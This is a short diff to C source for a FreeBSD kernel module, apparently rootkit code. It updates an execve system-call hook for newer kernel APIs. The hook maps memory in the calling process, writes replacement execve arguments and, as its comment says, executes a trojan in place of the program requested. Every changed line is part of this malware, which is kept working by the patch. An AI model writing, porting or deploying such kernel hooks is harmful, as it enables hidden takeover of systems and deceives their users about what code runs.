@@ -105,7 +105,7 @@ execve_hook(struct thread *td, void *syscall_args)
 		 * Allocate a PAGE_SIZE null region of memory for a new set
 		 * of execve arguments.
 		 */
-		vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE, FALSE,
+		vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE, 0, FALSE,
 		    VM_PROT_ALL, VM_PROT_ALL, 0);
 		vm->vm_dsize += btoc(PAGE_SIZE);
 
@@ -126,10 +126,10 @@ execve_hook(struct thread *td, void *syscall_args)
 		copyout(&kernel_ea, user_ea, sizeof(struct execve_args));
 
 		/* Execute TROJAN. */
-		return(execve(curthread, user_ea));
+		return(sys_execve(curthread, user_ea));
 	}
 
-	return(execve(td, syscall_args));
+	return(sys_execve(td, syscall_args));
 }
 
 /* The function called at load/unload. */
